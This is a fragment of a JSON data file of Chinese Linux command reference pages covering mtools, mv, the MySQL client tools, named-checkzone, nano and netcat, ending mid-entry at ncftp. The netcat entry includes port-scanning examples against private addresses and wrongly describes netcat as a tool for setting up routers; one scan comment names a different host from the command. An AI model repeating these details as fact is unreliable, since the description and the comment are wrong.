        "body": "<h1 id=\"mtools\">mtools</h1>\n<p>显示mtools支持的指令</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>mtools命令</strong> 显示mtools支持的指令，mtools为MS-DOS文件系统的工具程序，可模拟许多MS-DOS的指令。这些指令都是mtools的符号连接，因此会有一些共同的特性。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">mtools</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：长文件名重复时自动更改目标文件的长文件名；</span>\n<span class=\"hljs-deletion\">-A：短文件名重复但长文件名不同时自动更改目标文件的短文件名；</span>\n<span class=\"hljs-deletion\">-o：长文件名重复时，将目标文件覆盖现有的文件；</span>\n<span class=\"hljs-deletion\">-O：短文件名重复但长文件名不同时，将目标文件覆盖现有的文件；</span>\n<span class=\"hljs-deletion\">-r：长文件名重复时，要求用户更改目标文件的长文件名；</span>\n<span class=\"hljs-deletion\">-R：短文件名重复但长文件名不同时，要求用户更改目标文件的短文件名；</span>\n<span class=\"hljs-deletion\">-s：长文件名重复时，则不处理该目标文件；</span>\n<span class=\"hljs-deletion\">-S：短文件名重复但长文件名不同时，则不处理该目标文件；</span>\n<span class=\"hljs-deletion\">-v：执行时显示详细的说明；</span>\n<span class=\"hljs-deletion\">-V：显示版本信息。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>使用mtools命令显示其支持的所有的指令，输入如下命令：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]# mtools     #显示所有支持的指令名称\n<span class=\"hljs-title\">Supported commands:</span>\n<span class=\"hljs-built_in\">mattrib,</span> mbadblocks, mcat, mcd, mclasserase, mcopy, mdel, mdeltree\n<span class=\"hljs-built_in\">mdir,</span> mdoctorfat, mdu, mformat, minfo, mlabel, mmd, mmount\n<span class=\"hljs-built_in\">mpartition,</span> mrd, mread, mmove, mren, mshowfat, mtoolstest, mtype\n<span class=\"hljs-built_in\">mwrite,</span> mzip\n</code></pre>\n<p>如上所示，其显示的所有命令均为mtools工具所支持的。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "mv",
        "des": "用来对文件或目录重新命名",
        "body": "<h1 id=\"mv\">mv</h1>\n<p>用来对文件或目录重新命名</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>mv命令</strong> 用来对文件或目录重新命名，或者将文件从一个目录移到另一个目录中。source表示源文件或目录，target表示目标文件或目录。如果将一个文件移到一个已经存在的目标文件中，则目标文件的内容将被覆盖。</p>\n<p>mv命令可以用来将源文件移至一个目标文件中，或将一组文件移至一个目标目录中。源文件被移至目标文件有两种不同的结果：</p>\n<ol>\n<li> 如果目标文件是到某一目录文件的路径，源文件会被移到此目录下，且文件名不变。</li>\n<li> 如果目标文件不是目录文件，则源文件名（只能有一个）会变为此目标文件名，并覆盖己存在的同名文件。如果源文件和目标文件在同一个目录下，mv的作用就是改文件名。当目标文件是目录文件时，源文件或目录参数可以有多个，则所有的源文件都会被移至目标文件中。所有移到该目录下的文件都将保留以前的文件名。</li>\n</ol>\n<p>注意事项：mv与cp的结果不同，mv好像文件“搬家”，文件个数并未增加。而cp对文件进行复制，文件个数增加了。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">mv</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">--backup=&lt;备份模式&gt;：若需覆盖文件，则覆盖前先行备份；</span>\n<span class=\"hljs-deletion\">-b：当文件存在时，覆盖前，为其创建一个备份；</span>\n<span class=\"hljs-deletion\">-f：若目标文件或目录与现有的文件或目录重复，则直接覆盖现有的文件或目录；</span>\n<span class=\"hljs-deletion\">-i：交互式操作，覆盖前先行询问用户，如果源文件与目标文件或目标目录中的文件同名，则询问用户是否覆盖目标文件。用户输入”y”，表示将覆盖目标文件；输入”n”，表示取消对源文件的移动。这样可以避免误将文件覆盖。</span>\n<span class=\"hljs-deletion\">--strip-trailing-slashes：删除源文件中的斜杠“/”；</span>\n<span class=\"hljs-deletion\">-S&lt;后缀&gt;：为备份文件指定后缀，而不使用默认的后缀；</span>\n<span class=\"hljs-deletion\">--target-directory=&lt;目录&gt;：指定源文件要移动到目标目录；</span>\n<span class=\"hljs-deletion\">-u：当源文件比目标文件新或者目标文件不存在时，才执行移动操作。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  源文件：源文件列表。</li>\n<li>  目标文件：如果“目标文件”是文件名则在移动文件的同时，将其改名为“目标文件”；如果“目标文件”是目录名则将源文件移动到“目标文件”下。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<p>将目录<code>/usr/men</code>中的所有文件移到当前目录（用<code>.</code>表示）中：</p>\n<pre><code class=\"language-shell\">mv <span class=\"hljs-regexp\">/usr/m</span>en/* .\n</code></pre>\n<p>移动文件</p>\n<pre><code class=\"language-shell\">mv file_1.txt <span class=\"hljs-regexp\">/home/</span>office/\n</code></pre>\n<p>移动多个文件</p>\n<pre><code class=\"language-shell\">mv file_2.txt file_3.txt file_4.txt <span class=\"hljs-regexp\">/home/</span>office/\nmv *.txt <span class=\"hljs-regexp\">/home/</span>office/\n</code></pre>\n<p>移动目录</p>\n<pre><code class=\"language-shell\">mv directory_1<span class=\"hljs-regexp\">/ /</span>home<span class=\"hljs-regexp\">/office/</span>\n</code></pre>\n<p>重命名文件或目录</p>\n<pre><code class=\"language-shellbash\"><span class=\"hljs-attribute\">mv</span> file_1.txt file_2.txt <span class=\"hljs-comment\"># 将文件file_1.txt改名为file_2.txt</span>\n</code></pre>\n<p>重命名目录</p>\n<pre><code class=\"language-shell\">mv directory_1<span class=\"hljs-regexp\">/ directory_2/</span>\n</code></pre>\n<p>打印移动信息</p>\n<pre><code class=\"language-shellbash\">mv -v *.txt <span class=\"hljs-regexp\">/home/</span>office\n</code></pre>\n<p>提示是否覆盖文件</p>\n<pre><code class=\"language-shell\">mv -i file_1.txt <span class=\"hljs-regexp\">/home/</span>office\n</code></pre>\n<p>源文件比目标文件新时才执行更新</p>\n<pre><code class=\"language-shell\">mv -uv *.txt <span class=\"hljs-regexp\">/home/</span>office\n</code></pre>\n<p>不要覆盖任何已存在的文件</p>\n<pre><code class=\"language-shell\">mv -vn *.txt <span class=\"hljs-regexp\">/home/</span>office\n</code></pre>\n<p>复制时创建备份</p>\n<pre><code class=\"language-shell\">mv -bv *.txt <span class=\"hljs-regexp\">/home/</span>office\n</code></pre>\n<p>无条件覆盖已经存在的文件</p>\n<pre><code class=\"language-shell\">mv -f *.txt <span class=\"hljs-regexp\">/home/</span>office\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "mysql",
        "des": "MySQL服务器客户端工具",
        "body": "<h1 id=\"mysql\">mysql</h1>\n<p>MySQL服务器客户端工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>mysql命令</strong> 是MySQL数据库服务器的客户端工具，它工作在命令行终端中，完成对远程MySQL数据库服务器的操作。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">mysql</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-h：MySQL服务器的ip地址或主机名；</span>\n<span class=\"hljs-deletion\">-u：连接MySQL服务器的用户名；</span>\n<span class=\"hljs-deletion\">-e：执行mysql内部命令；</span>\n<span class=\"hljs-deletion\">-p：连接MySQL服务器的密码。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>数据库：指定连接服务器后自动打开的数据库。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "mysqladmin",
        "des": "MySQL服务器管理客户端",
        "body": "<h1 id=\"mysqladmin\">mysqladmin</h1>\n<p>MySQL服务器管理客户端</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>mysqladmin命令</strong> 是mysql服务器管理任务的客户端工具，它可以检查mytsql服务器的配置和当前工作状态，创建和删除数据库，创建用户和修改用户密码等操作。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">mysqladmin</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-h：MySQL服务器主机名或ip地址；</span>\n<span class=\"hljs-deletion\">-u：连接MySQL服务器的用户名；</span>\n<span class=\"hljs-deletion\">-p：连接MySQL服务器的密码；</span>\n<span class=\"hljs-deletion\">--help：显示帮助信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>管理命令：需要在MySQL服务器上执行的管理命令。</p>\n<p> <strong>mysqladmin支持下列命令：</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">create</span> databasename：创建一个新数据库；\ndrop databasename：删除一个数据库及其所有表；\nextended-<span class=\"hljs-built_in\">status</span>：给出服务器的一个扩展状态消息；\n<span class=\"hljs-built_in\">flush</span>-hosts：清空所有缓存的主机；\n<span class=\"hljs-built_in\">flush</span>-logs：清空所有日志；\n<span class=\"hljs-built_in\">flush</span>-tables：清空所有表；\n<span class=\"hljs-built_in\">flush</span>-privileges：再次装载授权表(同reload)；\nkill id,id,...：杀死mysql线程；\npassword 新口令：将老密码改为新密码；\nping：检查mysqld是否活着；\nprocesslist：显示服务其中活跃线程列表；\nreload：重载授权表；\nrefresh：清空所有表并关闭和打开日志文件；\nshutdown：关掉服务器；\n<span class=\"hljs-built_in\">status</span>：给出服务器的简短状态消息；\nvariables：打印出可用变量；\nversion：得到服务器的版本信息。\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "mysqldump",
        "des": "MySQL数据库中备份工具",
        "body": "<h1 id=\"mysqldump\">mysqldump</h1>\n<p>MySQL数据库中备份工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>mysqldump命令</strong> 是mysql数据库中备份工具，用于将MySQL服务器中的数据库以标准的sql语言的方式导出，并保存到文件中。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">mysqldump</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">--add-drop-table：在每个创建数据库表语句前添加删除数据库表的语句；</span>\n<span class=\"hljs-comment\">--add-locks：备份数据库表时锁定数据库表；</span>\n<span class=\"hljs-comment\">--all-databases：备份MySQL服务器上的所有数据库；</span>\n<span class=\"hljs-comment\">--comments：添加注释信息；</span>\n<span class=\"hljs-comment\">--compact：压缩模式，产生更少的输出；</span>\n<span class=\"hljs-comment\">--complete-insert：输出完成的插入语句；</span>\n<span class=\"hljs-comment\">--databases：指定要备份的数据库；</span>\n<span class=\"hljs-comment\">--default-character-set：指定默认字符集；</span>\n<span class=\"hljs-comment\">--force：当出现错误时仍然继续备份操作；</span>\n<span class=\"hljs-comment\">--host：指定要备份数据库的服务器；</span>\n<span class=\"hljs-comment\">--lock-tables：备份前，锁定所有数据库表；</span>\n<span class=\"hljs-comment\">--no-create-db：禁止生成创建数据库语句；</span>\n<span class=\"hljs-comment\">--no-create-info：禁止生成创建数据库库表语句；</span>\n<span class=\"hljs-comment\">--password：连接MySQL服务器的密码；</span>\n<span class=\"hljs-comment\">--port：MySQL服务器的端口号；</span>\n<span class=\"hljs-comment\">--user：连接MySQL服务器的用户名。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p> <strong>导出整个数据库</strong> </p>\n<pre><code class=\"language-shell\">mysqldump -u 用户名 -<span class=\"hljs-selector-tag\">p</span> 数据库名 &gt; 导出的文件名\nmysqldump -u linuxde -<span class=\"hljs-selector-tag\">p</span> smgp_apps_linuxde &gt; linuxde<span class=\"hljs-selector-class\">.sql</span>\n</code></pre>\n<p> <strong>导出一个表</strong> </p>\n<pre><code class=\"language-shell\">mysqldump -u 用户名 -<span class=\"hljs-selector-tag\">p</span> 数据库名 表名&gt; 导出的文件名\nmysqldump -u linuxde -<span class=\"hljs-selector-tag\">p</span> smgp_apps_linuxde users &gt; linuxde_users<span class=\"hljs-selector-class\">.sql</span>\n</code></pre>\n<p> <strong>导出一个数据库结构</strong> </p>\n<pre><code class=\"language-shell\">mysqldump -u linuxde -p -d --<span class=\"hljs-keyword\">add</span>-<span class=\"hljs-keyword\">drop</span>-<span class=\"hljs-keyword\">table</span> smgp_apps_linuxde &gt; linuxde_db.sql\n</code></pre>\n<p><code>-d</code>没有数据，<code>--add-drop-tabl</code>e每个create语句之前增加一个<code>drop&nbsp;table</code></p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "mysqlimport",
        "des": "为MySQL服务器用命令行方式导入数据",
        "body": "<h1 id=\"mysqlimport\">mysqlimport</h1>\n<p>为MySQL服务器用命令行方式导入数据</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>mysqlimport命令</strong> 为mysql数据库服务器提供了一种命令行方式导入数据工具，它从特定格式的文本文件中读取数据插入MySQL数据库表中。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">mysqlimport</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-D：导入数据前清空表；</span>\n<span class=\"hljs-deletion\">-f：出现错误时继续处理剩余的操作；</span>\n<span class=\"hljs-deletion\">-h：MySQL服务器的ip地址或主机名；</span>\n<span class=\"hljs-deletion\">-u：连接MySQL服务器的用户名；</span>\n<span class=\"hljs-deletion\">-p：连接MySQL服务器的密码。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  数据库名：指定要导入的数据库名称；</li>\n<li>  文本文件：包含特定格式文本文件。</li>\n</ul>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "mysqlshow",
        "des": "显示MySQL中数据库相关信息",
        "body": "<h1 id=\"mysqlshow\">mysqlshow</h1>\n<p>显示MySQL中数据库相关信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>mysqlshow命令</strong> 用于显示mysql服务器中数据库、表和列表信息。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">mysqlshow</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-h：MySQL服务器的ip地址或主机名；</span>\n<span class=\"hljs-deletion\">-u：连接MySQL服务器的用户名；</span>\n<span class=\"hljs-deletion\">-p：连接MySQL服务器的密码；</span>\n<span class=\"hljs-deletion\">--count：显示每个数据表中数据的行数；</span>\n<span class=\"hljs-deletion\">-k：显示数据表的索引；</span>\n<span class=\"hljs-deletion\">-t：显示数据表的类型；</span>\n<span class=\"hljs-deletion\">-i：显示数据表的额外信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>数据库信息：指定要显示的数据库信息，可以是一个数据库名，或者是数据库名和表名，或者是数据库名、表名和列名。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "named-checkzone",
        "des": "使用named-checkzone命令可以进行区域文件有效性检查和转换，必须指定区域名称和区域文件名称",
        "body": "<h1 id=\"named-checkzone\">named-checkzone</h1>\n<p>使用named-checkzone命令可以进行区域文件有效性检查和转换，必须指定区域名称和区域文件名称</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>named-checkzone命令</strong> 可以进行区域文件有效性检查和转换，必须指定区域名称和区域文件名称。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">named-checkzone <span class=\"hljs-selector-attr\">[选项]</span> <span class=\"hljs-selector-attr\">[区域名]</span> <span class=\"hljs-selector-attr\">[区域文件名]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-q 安静模式</span>\n<span class=\"hljs-deletion\">-d 启用调试</span>\n<span class=\"hljs-deletion\">-c &lt;类别&gt; 指定区域的类别。如果没指定就使用IN</span>\n</code></pre>\n<h3 id=\"例子\">例子</h3>\n<p>对区域文件/var/named/192.168.0.rev进行有效性检查和转换。</p>\n<pre><code class=\"language-shell\">[root@localhost ~]# named-checkzone <span class=\"hljs-number\">0.168.192</span>.in-addr.arpa /var/named/<span class=\"hljs-number\">192.168.0</span>.rev\nzone<span class=\"hljs-number\">0.168.192</span>.in-addr.arpa/<span class=\"hljs-keyword\">IN</span>: loaded serial <span class=\"hljs-number\">1268360612</span>\nOK\n</code></pre>\n<p>对区域文件/var/named/sh.com.hosts进行有效性检查和转换。</p>\n<pre><code class=\"language-shell\">[root@localhost ~]#  named-checkzone <span class=\"hljs-keyword\">sh</span>.<span class=\"hljs-keyword\">com</span> /var/named/<span class=\"hljs-keyword\">sh</span>.<span class=\"hljs-keyword\">com</span>.hosts\nzonesh.<span class=\"hljs-keyword\">com</span>/IN: <span class=\"hljs-keyword\">sh</span>.<span class=\"hljs-keyword\">com</span>/MX <span class=\"hljs-string\">'mail.sh.com'</span> <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">a</span> CNAME (illegal)\nzonesh.<span class=\"hljs-keyword\">com</span>/IN: loaded serial <span class=\"hljs-number\">1268360234</span>\nOK\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "nano",
        "des": "字符终端文本编辑器",
        "body": "<h1 id=\"nano\">nano</h1>\n<p>字符终端文本编辑器</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>nano</strong> 是一个字符终端的文本编辑器，有点像DOS下的editor程序。它比vi/vim要简单得多，比较适合Linux初学者使用。某些Linux发行版的默认编辑器就是nano。</p>\n<p>nano命令可以打开指定文件进行编辑，默认情况下它会自动断行，即在一行中输入过长的内容时自动拆分成几行，但用这种方式来处理某些文件可能会带来问题，比如Linux系统的配置文件，自动断行就会使本来只能写在一行上的内容折断成多行了，有可能造成系统不灵了。因此，如果你想避免这种情况出现，就加上<code>-w</code>选项吧。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">nano [选项] [[+行,列] 文件名]...\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"> -h, -?         <span class=\"hljs-comment\">--help                  显示此信息</span>\n +行,列                                 从所指列数与行数开始\n -A             <span class=\"hljs-comment\">--smarthome             启用智能 HOME 键</span>\n -B             <span class=\"hljs-comment\">--backup                储存既有文件的备份</span>\n -C &lt;目录&gt;      <span class=\"hljs-comment\">--backupdir=&lt;目录&gt;      用以储存独一备份文件的目录</span>\n -D             <span class=\"hljs-comment\">--boldtext              用粗体替代颜色反转</span>\n -E             <span class=\"hljs-comment\">--tabstospaces          将已输入的制表符转换为空白</span>\n -F             <span class=\"hljs-comment\">--multibuffer           启用多重文件缓冲区功能</span>\n -H             <span class=\"hljs-comment\">--historylog            记录与读取搜索/替换的历史字符串</span>\n -I             <span class=\"hljs-comment\">--ignorercfiles         不要参考nanorc 文件</span>\n -K             <span class=\"hljs-comment\">--rebindkeypad          修正数字键区按键混淆问题</span>\n -L             <span class=\"hljs-comment\">--nonewlines            不要将换行加到文件末端</span>\n -N             <span class=\"hljs-comment\">--noconvert             不要从 DOS/Mac 格式转换</span>\n -O             <span class=\"hljs-comment\">--morespace             编辑时多使用一行</span>\n -Q &lt;字符串&gt;    <span class=\"hljs-comment\">--quotestr=&lt;字符串&gt;     引用代表字符串</span>\n -R             <span class=\"hljs-comment\">--restricted            限制模式</span>\n -S             <span class=\"hljs-comment\">--smooth                按行滚动而不是半屏</span>\n -T &lt;<span class=\"hljs-comment\">#列数&gt;     --tabsize=&lt;#列数&gt;       设定制表符宽度为 #列数</span>\n -U             <span class=\"hljs-comment\">--quickblank            状态行快速闪动</span>\n -V             <span class=\"hljs-comment\">--version               显示版本资讯并离开</span>\n -W             <span class=\"hljs-comment\">--wordbounds            更正确地侦测单字边界</span>\n -Y &lt;字符串&gt;    <span class=\"hljs-comment\">--syntax=&lt;字符串&gt;       用于加亮的语法定义</span>\n -c             <span class=\"hljs-comment\">--const                 持续显示游标位置</span>\n -d             <span class=\"hljs-comment\">--rebinddelete          修正退格键/删除键混淆问题</span>\n -i             <span class=\"hljs-comment\">--autoindent            自动缩进新行</span>\n -k             <span class=\"hljs-comment\">--cut                   从游标剪切至行尾</span>\n -l             <span class=\"hljs-comment\">--nofollow              不要依照符号连结，而是覆盖</span>\n -m             <span class=\"hljs-comment\">--mouse                 启用鼠标功能</span>\n -o &lt;目录&gt;      <span class=\"hljs-comment\">--operatingdir=&lt;目录&gt;   设定操作目录</span>\n -p             <span class=\"hljs-comment\">--preserve              保留XON (^Q) 和XOFF (^S) 按键</span>\n -q             <span class=\"hljs-comment\">--quiet                 沉默忽略启动问题, 比如rc 文件错误</span>\n -r &lt;<span class=\"hljs-comment\">#列数&gt;     --fill=&lt;#列数&gt;          设定折行宽度为 #列数</span>\n -s &lt;程序&gt;      <span class=\"hljs-comment\">--speller=&lt;程序&gt;        启用替代的拼写检查程序</span>\n -t             <span class=\"hljs-comment\">--tempfile              离开时自动储存，不要提示</span>\n -u             <span class=\"hljs-comment\">--undo                  允许通用撤销[试验性特性]</span>\n -v             <span class=\"hljs-comment\">--view                  查看(只读)模式</span>\n -w             <span class=\"hljs-comment\">--nowrap                不要自动换行</span>\n -x             <span class=\"hljs-comment\">--nohelp                不要显示辅助区</span>\n -z             <span class=\"hljs-comment\">--suspend               启用暂停功能</span>\n -$             <span class=\"hljs-comment\">--softwrap              启用软换行</span>\n -<span class=\"hljs-keyword\">a</span>, -b, -e,\n -f, -g, -j                             (忽略，为与pico 相容)\n</code></pre>\n<h3 id=\"用法\">用法</h3>\n<p><strong>光标控制</strong> </p>\n<ul>\n<li>移动光标：使用用方向键移动。</li>\n<li>选择文字：按住鼠标左键拖到。</li>\n</ul>\n<p><strong>复制、剪贴和粘贴</strong> </p>\n<ul>\n<li>复制一整行：Alt+6</li>\n<li>剪贴一整行：Ctrl+K</li>\n</ul>\n<p><strong>粘贴：Ctrl+U</strong> </p>\n<p>如果需要复制／剪贴多行或者一行中的一部分，先将光标移动到需要复制／剪贴的文本的开头，按Ctrl+6（或者Alt+A）做标记，然后移动光标到 待复制／剪贴的文本末尾。这时选定的文本会反白，用Alt+6来复制，Ctrl+K来剪贴。若在选择文本过程中要取消，只需要再按一次Ctrl+6。</p>\n<p><strong>搜索</strong> </p>\n<p>按Ctrl+W，然后输入你要搜索的关键字，回车确定。这将会定位到第一个匹配的文本，接着可以用Alt+W来定位到下一个匹配的文本。</p>\n<p><strong>翻页</strong> </p>\n<ul>\n<li><code>Ctrl+Y</code> 到上一页</li>\n<li><code>Ctrl+V</code> 到下一页</li>\n</ul>\n<p><strong>保存</strong> </p>\n<p>使用Ctrl+O来保存所做的修改</p>\n<p><strong>退出</strong> </p>\n<p>按Ctrl+X</p>\n<p>如果你修改了文件，下面会询问你是否需要保存修改。输入Y确认保存，输入N不保存，按Ctrl+C取消返回。如果输入了Y，下一步会让你输入想要保存的文件名。如果不需要修改文件名直接回车就行；若想要保存成别的名字（也就是另存为）则输入新名称然后确 定。这个时候也可用Ctrl+C来取消返回。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "nc",
        "des": "用于设置路由器，是网络工具中的瑞士军刀",
        "body": "<h1 id=\"nc\">nc</h1>\n<p>用于设置路由器，是网络工具中的瑞士军刀</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>nc命令</strong> 全称<strong>netcat</strong>，用于设置路由器。它能通过 TCP 和 UDP 在网络中读写数据。通过与其他工具结合和重定向，你可以在脚本中以多种方式使用它。使用 netcat 命令所能完成的事情令人惊讶。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">nc <span class=\"hljs-selector-attr\">[-hlnruz]</span><span class=\"hljs-selector-attr\">[-g&lt;网关...&gt;]</span><span class=\"hljs-selector-attr\">[-G&lt;指向器数目&gt;]</span><span class=\"hljs-selector-attr\">[-i&lt;延迟秒数&gt;]</span><span class=\"hljs-selector-attr\">[-o&lt;输出文件&gt;]</span><span class=\"hljs-selector-attr\">[-p&lt;通信端口&gt;]</span>\n<span class=\"hljs-selector-attr\">[-s&lt;来源位址&gt;]</span><span class=\"hljs-selector-attr\">[-v...]</span><span class=\"hljs-selector-attr\">[-w&lt;超时秒数&gt;]</span><span class=\"hljs-selector-attr\">[主机名称]</span><span class=\"hljs-selector-attr\">[通信端口...]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-g&lt;网关&gt; 设置路由器跃程通信网关，最多可设置8个。</span>\n<span class=\"hljs-deletion\">-G&lt;指向器数目&gt; 设置来源路由指向器，其数值为4的倍数。</span>\n<span class=\"hljs-deletion\">-h 在线帮助。</span>\n<span class=\"hljs-deletion\">-i&lt;延迟秒数&gt; 设置时间间隔，以便传送信息及扫描通信端口。</span>\n<span class=\"hljs-deletion\">-l 使用监听模式，管控传入的资料。</span>\n<span class=\"hljs-deletion\">-n 直接使用IP地址，而不通过域名服务器。</span>\n<span class=\"hljs-deletion\">-o&lt;输出文件&gt; 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。</span>\n<span class=\"hljs-deletion\">-p&lt;通信端口&gt; 设置本地主机使用的通信端口。</span>\n<span class=\"hljs-deletion\">-r 乱数指定本地与远端主机的通信端口。</span>\n<span class=\"hljs-deletion\">-s&lt;来源位址&gt; 设置本地主机送出数据包的IP地址。</span>\n<span class=\"hljs-deletion\">-u 使用UDP传输协议。</span>\n<span class=\"hljs-deletion\">-v 显示指令执行过程。</span>\n<span class=\"hljs-deletion\">-w&lt;超时秒数&gt; 设置等待连线的时间。</span>\n<span class=\"hljs-deletion\">-z 使用0输入/输出模式，只在扫描通信端口时使用。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>TCP端口扫描</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-string\">[root@localhost ~]</span># nc -v -z -w2 <span class=\"hljs-number\">192</span>.<span class=\"hljs-number\">168</span>.<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">3</span> <span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">100</span> \n<span class=\"hljs-number\">192.168.0.3</span>: inverse host lookup failed: Unknown host\n(UNKNOWN) <span class=\"hljs-string\">[192.168.0.3]</span> <span class=\"hljs-number\">80</span> (http) open\n(UNKNOWN) <span class=\"hljs-string\">[192.168.0.3]</span> <span class=\"hljs-number\">23</span> (telnet) open\n(UNKNOWN) <span class=\"hljs-string\">[192.168.0.3]</span> <span class=\"hljs-number\">22</span> (ssh) open\n</code></pre>\n<p>扫描192.168.0.3 的端口 范围是 1-100\n扫描UDP端口</p>\n<pre><code class=\"language-shell\">[root@localhost ~]# nc -u -z -w<span class=\"hljs-number\">2 192.168.0</span>.<span class=\"hljs-number\">1 1-1000</span>  # 扫描<span class=\"hljs-number\">192.168.0.3</span> 的端口 范围是 <span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">1000</span>\n</code></pre>\n<p>扫描指定端口</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-selector-attr\">[root@localhost ~]</span># nc -nvv 192<span class=\"hljs-selector-class\">.168</span><span class=\"hljs-selector-class\">.0</span><span class=\"hljs-selector-class\">.1</span> 80 # 扫描 80端口\n(UNKNOWN) <span class=\"hljs-selector-attr\">[192.168.0.1]</span> 80 (?) open\ny  <span class=\"hljs-comment\">//用户输入</span>\n</code></pre>\n<p>查看从服务器到目的地的出站端口 443 是否被防火墙阻止</p>\n<pre><code class=\"language-shellbash\"><span class=\"hljs-attribute\">nc</span> -vz acme-v02.api.letsencrypt.org <span class=\"hljs-number\">443</span> -w2\n<span class=\"hljs-comment\"># Ncat: Version 7.50 ( https://nmap.org/ncat )</span>\n<span class=\"hljs-comment\"># Ncat: Connected to 23.77.214.183:443.</span>\n<span class=\"hljs-comment\"># Ncat: 0 bytes sent, 0 bytes received in 0.07 seconds.</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "ncftp",
        "des": "是增强的的FTP工具",
